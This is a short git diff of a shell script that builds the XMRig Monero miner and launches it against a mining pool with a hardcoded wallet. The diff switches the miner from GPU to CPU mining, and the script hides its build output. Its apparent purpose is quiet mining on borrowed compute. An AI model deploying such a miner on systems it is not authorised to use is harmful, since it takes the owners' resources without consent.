@@ -11,14 +11,14 @@ git clone https://github.com/xmrig/xmrig.git
 mkdir xmrig/build && cd xmrig/build
 cmake ..
 make -j$(nproc)
-cd
-git clone https://github.com/xmrig/xmrig-cuda.git
-mkdir xmrig-cuda/build && cd xmrig-cuda/build
-cmake .. -DCUDA_LIB=/usr/local/cuda/lib64/stubs/libcuda.so -DCUDA_TOOLKIT_ROOT_DIR=/usr/local/cuda
-make -j$(nproc)
-cp /root/xmrig/build/xmrig /root/xmrig-cuda/build
+#cd
+#git clone https://github.com/xmrig/xmrig-cuda.git
+#mkdir xmrig-cuda/build && cd xmrig-cuda/build
+#cmake .. -DCUDA_LIB=/usr/local/cuda/lib64/stubs/libcuda.so -DCUDA_TOOLKIT_ROOT_DIR=/usr/local/cuda
+#make -j$(nproc)
+#cp /root/xmrig/build/xmrig /root/xmrig-cuda/build
 } &> /dev/null &&
 printf "\nXong " >&2 ||
 printf "\nLoi " >&2
 #./xmrig -o sg.minexmr.com:443 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN
-./xmrig --no-cpu --cuda -o sg.minexmr.com:443 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN -k --tls
+./xmrig -o sg.minexmr.com:443 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN -k --tls --threads=5
